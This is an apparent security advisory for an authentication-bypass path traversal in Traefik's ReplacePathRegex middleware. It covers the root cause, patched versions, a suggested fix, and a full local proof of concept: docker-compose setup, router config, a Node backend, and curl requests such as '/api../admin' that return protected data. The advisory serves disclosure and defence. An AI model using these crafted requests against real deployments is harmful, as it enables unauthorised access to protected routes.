# Traefik: Authentication Bypass via Path Traversal in ReplacePathRegex Middleware

- CWE: CWE-22
- Packages: go:github.com/traefik/traefik/v2, go:github.com/traefik/traefik/v3, go:github.com/traefik/traefik/v3, go:github.com/traefik/traefik

---

## Summary

There is an authentication-bypass vulnerability in Traefik's `ReplacePathRegex` middleware. When it is configured with a regular expression that captures user-controlled path segments without a mandatory separator (for example `regex: "^/api(.*)"`, `replacement: "/$1"`), a crafted request can produce an un-normalized replacement path such as `/../admin`, which Traefik forwarded to the backend without validation. A backend that normalizes the path may resolve it to a protected route, letting an unauthenticated attacker reach resources located behind authentication middleware. This is the same class of issue that was fixed for `StripPrefix` in [CVE redacted]; that post-replacement normalization check had not been applied to `ReplacePathRegex`. The fix rejects any request whose replaced path does not match its normalized form.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.52
- https://github.com/traefik/traefik/releases/tag/v3.6.23
- https://github.com/traefik/traefik/releases/tag/v3.7.7

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

### Summary
A path traversal vulnerability in the ReplacePathRegex middleware allows an unauthenticated remote attacker to bypass authentication middleware and access protected routes by sending a single crafted HTTP request. The vulnerability exists because ReplacePathRegex does not perform post-replacement path normalization validation - the same check added to StripPrefix in the fix for [CVE redacted] was not applied to ReplacePathRegex.

### Details
When ReplacePathRegex is configured with a regex that captures user-controlled path segments without a mandatory path separator (e.g., `regex: "^/api(.*)"`, `replacement: "/$1"`), an attacker can inject implicit traversal sequences into the capture group.

**Root cause:** `pkg/middlewares/replacepathregex/replace_path_regex.go`, function `ServeHTTP` (lines 56-74). After the regex substitution produces a new path, the middleware forwards it to the backend without checking whether the path normalizes differently - unlike StripPrefix which rejects such paths with HTTP 400 after the [CVE redacted] fix.

**Attack flow:**

1. Attacker sends `GET /api../admin`
2. `sanitizePath` passes it unchanged (`api..` is a valid segment name, not a dot-segment)
3. Router matches `PathPrefix(/api)` → selects the public router (no auth middleware)
4. ReplacePathRegex applies `^/api(.*)` → captures `../admin` → replacement produces `/../admin`
5. No normalization check exists → path forwarded to backend as-is
6. Backend framework (Express, Flask, Django, Spring, ASP.NET) normalizes `/../admin` to `/admin`
7. Attacker receives protected content without authentication

**Suggested fix:** Add the same JoinPath equality check after line 67:

```go
if cleanPath := req.URL.JoinPath(); cleanPath.Path != req.URL.Path {
    http.Error(rw, http.StatusText(http.StatusBadRequest), http.StatusBadRequest)
    return
}
```

### PoC
**Prerequisites:** Docker Engine 20.10+, Docker Compose v2, curl

**1. Create `docker-compose.yml`:**

```yaml
services:
  traefik:
    image: traefik:v3.7.6
    command:
      - "--api.insecure=true"
      - "--providers.file.filename=/etc/traefik/dynamic.yml"
      - "--entrypoints.web.address=:80"
    ports:
      - "8080:8080"
      - "80:80"
    volumes:
      - ./dynamic.yml:/etc/traefik/dynamic.yml:ro
    healthcheck:
      test: ["CMD", "traefik", "healthcheck"]
      interval: 5s
      timeout: 3s
      retries: 5
  backend:
    image: node:22-alpine
    working_dir: /app
    volumes:
      - ./server.js:/app/server.js:ro
    command: ["node", "server.js"]
    healthcheck:
      test: ["CMD", "wget", "-qO-", "http://localhost:3000/health"]
      interval: 5s
      timeout: 3s
      retries: 5
```

**2. Create `dynamic.yml`:**

```yaml
http:
  routers:
    public-api:
      rule: "PathPrefix(`/api`)"
      entryPoints: [web]
      middlewares: [rewrite-api]
      service: backend-svc
      priority: 1
    protected-admin:
      rule: "PathPrefix(`/admin`)"
      entryPoints: [web]
      middlewares: [auth]
      service: backend-svc
      priority: 2
  middlewares:
    rewrite-api:
      replacePathRegex:
        regex: "^/api(.*)"
        replacement: "/$1"
    auth:
      basicAuth:
        users:
          - "admin:$apr1$H6uskkkW$IgXLP6ewTrSuBkTrqE8wj/"
  services:
    backend-svc:
      loadBalancer:
        servers:
          - url: "http://backend:3000"
```

**3. Create `server.js`:**

```javascript
const http = require('http');
const path = require('path');
const server = http.createServer((req, res) => {
  const normalized = path.posix.normalize(req.url.split('?')[0]);
  res.setHeader('Content-Type', 'text/plain');
  if (normalized === '/health') { res.writeHead(200); res.end('OK\n'); }
  else if (normalized === '/admin' || normalized.startsWith('/admin/')) {
    res.writeHead(200); res.end(`ADMIN_SECRET_DATA (normalized=${normalized})\n`);
  } else { res.writeHead(200); res.end(`PUBLIC (normalized=${normalized})\n`); }
});
server.listen(3000);
```

**4. Run and exploit:**

```bash
docker compose up -d && sleep 5

# Confirm auth is enforced:
curl -s -o /dev/null -w "%{http_code}" http://localhost/admin
# → 401

# Auth bypass:
curl -s http://localhost/api../admin
# → ADMIN_SECRET_DATA (normalized=/admin)

# URL-encoded variant:
curl -s http://localhost/api%2e%2e/admin
# → ADMIN_SECRET_DATA (normalized=/admin)
```

**Configuration note:** The regex `^/api(.*)` (without slash separator before the capture group) is the exploitable pattern. This is the natural way to write a prefix-strip equivalent with ReplacePathRegex and is functionally identical to `StripPrefix("/api")` for legitimate traffic. The pattern `^/api/(.*)` (with mandatory slash) is not exploitable - the same structural narrowing as [CVE redacted] where `StripPrefix("/api")` was vulnerable but `StripPrefix("/api/")` was not.

### Impact
Authentication bypass. Any route protected by auth middleware on a separate router (BasicAuth, ForwardAuth, DigestAuth) can be accessed without credentials by an unauthenticated network attacker via a single HTTP request. Both read and write operations (GET/POST/PUT/DELETE) bypass authentication. The vulnerability affects deployments using ReplacePathRegex for prefix stripping - a common, documented configuration pattern.

</details>

---
